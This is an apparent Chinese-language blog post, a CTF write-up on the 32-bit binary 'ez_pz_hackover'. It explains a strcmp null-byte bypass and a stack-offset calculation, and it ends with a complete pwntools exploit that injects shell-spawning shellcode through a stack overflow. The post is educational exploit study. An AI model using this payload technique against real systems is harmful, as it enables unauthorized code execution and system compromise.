@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="查看程序保护只有开满保护的RELRO，因此不能更改got表。 ida打开程序程序没有后门函数也没有&#x2F;bin&#x2F;sh字符漏洞函数溢出函数 程序逻辑分析可以看到，程序一开始就把字符数组s的地址打印出来给你了。看到漏洞函数中的s第一次以为是栈溢出点，但是由于fgets函数最多读取1023个字符，1023&#x3D;0x3ff&lt;0x40c因此在漏洞函数里，是s是溢出不了的。我们接着往下看之后的代码:v0存储了我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。">
+<meta property="og:url" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="查看程序保护只有开满保护的RELRO，因此不能更改got表。 ida打开程序程序没有后门函数也没有&#x2F;bin&#x2F;sh字符漏洞函数溢出函数 程序逻辑分析可以看到，程序一开始就把字符数组s的地址打印出来给你了。看到漏洞函数中的s第一次以为是栈溢出点，但是由于fgets函数最多读取1023个字符，1023&#x3D;0x3ff&lt;0x40c因此在漏洞函数里，是s是溢出不了的。我们接着往下看之后的代码:v0存储了我">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617105959.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617112602.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617110147.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617110227.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617110227.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617114632.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617115414.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120028.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120350.png">
+<meta property="article:published_time" content="2023-06-17T02:57:04.000Z">
+<meta property="article:modified_time" content="2023-06-17T06:49:38.281Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617105959.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-32位shellcode-绕过strcmp函数和计算shellcode在栈上的偏移。" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" class="article-date">
+  <time datetime="2023-06-17T02:57:04.000Z" itemprop="datePublished">2023-06-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h1><p>只有开满保护的RELRO，因此不能更改got表。<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617105959.png" alt="Alt text"></p>
+<h1 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h1><p>程序没有后门函数也没有/bin/sh字符<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617112602.png" alt="Alt text"><br>漏洞函数<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617110147.png" alt="Alt text"><br>溢出函数<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617110227.png" alt="Alt text"></p>
+<h1 id="程序逻辑分析"><a href="#程序逻辑分析" class="headerlink" title="程序逻辑分析"></a>程序逻辑分析</h1><p>可以看到，程序一开始就把字符数组s的地址打印出来给你了。<br>看到漏洞函数中的s第一次以为是栈溢出点，但是由于fgets函数最多读取1023个字符，1023=0x3ff&lt;0x40c<br>因此在漏洞函数里，是s是溢出不了的。<br>我们接着往下看之后的代码:<br>v0存储了我们输入进s数组的字符的长度。<br>v3检查s数组是否有\n以便把\n替换成\x00用来截断字符最后结果存储在V3里。<br>然后是欢迎，printf打出输入s数组的字符串。</p>
+<h3 id="strcmp函数"><a href="#strcmp函数" class="headerlink" title="strcmp函数"></a>strcmp函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接下来是strcmp函数检查s数组里的字符串，是crashme，如果是则把s数组和0x400作为vuln函数的参数并跳转到vuln函数里，否则就结束程序。</span><br></pre></td></tr></table></figure>
+<p>我们跳转到vuln函数中，可以看到vuln函数定义了一个字符串数组：dest。<br>然后通过调用memcpy函数，将数组s里的内容复制到dest数组里。刚刚讲过，这里的复制的长度为0x400所以这里可以作为我们的溢出点，前提是要绕过strcmp函数才行<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617110227.png" alt="Alt text"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>通过查看程序保护我们知道可以使用在栈上执行shellcode代码来获取shell。并且已经找到了溢出点函数vuln。  </p>
+<p>我们可以在漏洞函数的输入的时候把shellcode写入s里面去，并且在vuln函数里进行栈溢出，把返回地址修改为s数组里执行shellcode的地址即可获得shell。  </p>
+<p>接下来要做的起始就是绕过strcmp函数和计算shellcode在栈上的偏移了。</p>
+<h1 id="绕过strcmp函数"><a href="#绕过strcmp函数" class="headerlink" title="绕过strcmp函数"></a>绕过strcmp函数</h1><h3 id="strcmp函数的解释"><a href="#strcmp函数的解释" class="headerlink" title="strcmp函数的解释"></a>strcmp函数的解释</h3><p>可以看到strcmp是区分大小写的，并且要校验的字符长度也要相同才行。简而言之，似乎只能老老实实地只输入crashme才能够通过strcmp函数。<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617114632.png" alt="Alt text"><br>但是，由于它是依次比较的，我们可以在它读到crashme之后马上加上字符截断符\x00来截断strcmp继续比较字符，从而实现绕过strcmp函数达到跳转溢出函数vuln的目的<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617115414.png" alt="Alt text"></p>
+<h1 id="计算shellcode在栈上的偏移"><a href="#计算shellcode在栈上的偏移" class="headerlink" title="计算shellcode在栈上的偏移"></a>计算shellcode在栈上的偏移</h1><p>我们打印出了s数组的地址:0xff884fec<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120028.png" alt="Alt text"></p>
+<h4 id="通过pwndbg运行脚本"><a href="#通过pwndbg运行脚本" class="headerlink" title="通过pwndbg运行脚本"></a>通过pwndbg运行脚本</h4><p>我们可以看到，当把返回地址覆盖为s数组的地址的时候，程序执行流直接运行到了0xff884ffc这个地方，而执行shellcode的地址为:0xff884fd0。<br>因此，覆盖返回地址的s数组地址的偏移应该为:<br>(0xffc - 0xfd0) + (0xffc - 0xfec)= 1c<br><img src="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/QQ%E6%88%AA%E5%9B%BE20230617120350.png" alt="Alt text"></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./ez_pz_hackover&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">s_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">print<span class="string">&quot;s_addr=&gt;&quot;</span>,<span class="title function_">hex</span>(s_addr)</span><br><span class="line">#shellcode_addr = s_addr + <span class="number">0x1e</span></span><br><span class="line">shellcode_addr = s_addr-<span class="number">0x1c</span></span><br><span class="line">#shellcode_addr = s_addr</span><br><span class="line">print<span class="string">&quot;shellcode_addr=&gt;&quot;</span>,<span class="title function_">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="title function_">asm</span>(shellcraft.<span class="title function_">sh</span>())</span><br><span class="line">print<span class="string">&quot;shellcode=&gt;&quot;</span>,shellcode</span><br><span class="line">#print<span class="string">&quot;shellcode=&gt;&quot;</span>,<span class="title function_">int</span>(shellcode_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload = b<span class="string">&quot;crashme&quot;</span></span><br><span class="line">payload = b<span class="string">&quot;crashme\x00&quot;</span>+ b<span class="string">&quot;A&quot;</span>*<span class="number">18</span> + <span class="title function_">p32</span>(shellcode_addr)</span><br><span class="line">#进行栈溢出要填充多少垃圾数据需要自己调试出来。</span><br><span class="line">payload += shellcode</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,b<span class="string">&quot;b *0x80486E2&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/" data-id="clizn451v000378v92xf4cokj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">32位shellcode(其实是32位syscall)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/13/32%E4%BD%8Dshellcode-%E5%85%B6%E5%AE%9E%E6%98%AF32%E4%BD%8Dsyscall/">32位shellcode(其实是32位syscall)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/07/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
